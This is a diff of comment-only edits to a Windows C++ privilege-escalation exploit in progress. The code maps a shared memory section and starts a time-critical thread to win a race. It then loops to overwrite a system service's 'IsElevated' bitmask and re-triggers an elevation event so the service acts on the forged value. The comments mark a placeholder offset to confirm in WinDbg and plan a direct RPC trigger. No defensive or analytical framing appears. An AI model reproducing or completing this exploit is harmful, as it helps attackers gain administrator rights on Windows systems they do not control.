@@ -42,7 +42,7 @@ int wmain() {
     void* pSharedMemory = MapViewOfFile(hSection, FILE_MAP_ALL_ACCESS, 0, 0, 0);
     memset(pSharedMemory, 0, 0x1000);
 
-    // 4. THE RACE — priority on the trigger thread, not main (v3 fix)
+    // 4. THE RACE — priority on the trigger thread, not main
     HANDLE hThread = CreateThread(NULL, 0, TriggerRace, NULL, 0, NULL);
     SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);
 
@@ -51,7 +51,7 @@ int wmain() {
 
     // 5. THE HIJACK
     // Overwrite the service dispatcher's 'IsElevated' bitmask.
-    // TODO: 0x20 is still a placeholder — confirm via WinDbg:
+    // TODO: 0x20 is a placeholder — confirm the real offset via WinDbg:
     //   bp ntdll!NtMapViewOfSection "dt <struct> @rax+0x20; g"
     while (true) {
         if (NtOpenSection(&hMapping, SECTION_ALL_ACCESS, &objAttr) == 0) {
@@ -64,7 +64,7 @@ int wmain() {
     // 6. THE TRIGGER
     // Re-fire the elevation event so the service re-enters the code path that
     // reads the shared section. The service's mapped view already sees our
-    // written value — this just needs to make the service act on it.
+    // written value — this makes the service act on it.
     // Replace with a direct RPC/named-pipe call once the target service's
     // IPC mechanism is confirmed via reverse engineering.
     SHELLEXECUTEINFO retrigger = { sizeof(retrigger), SEE_MASK_NOZONECHECKS,
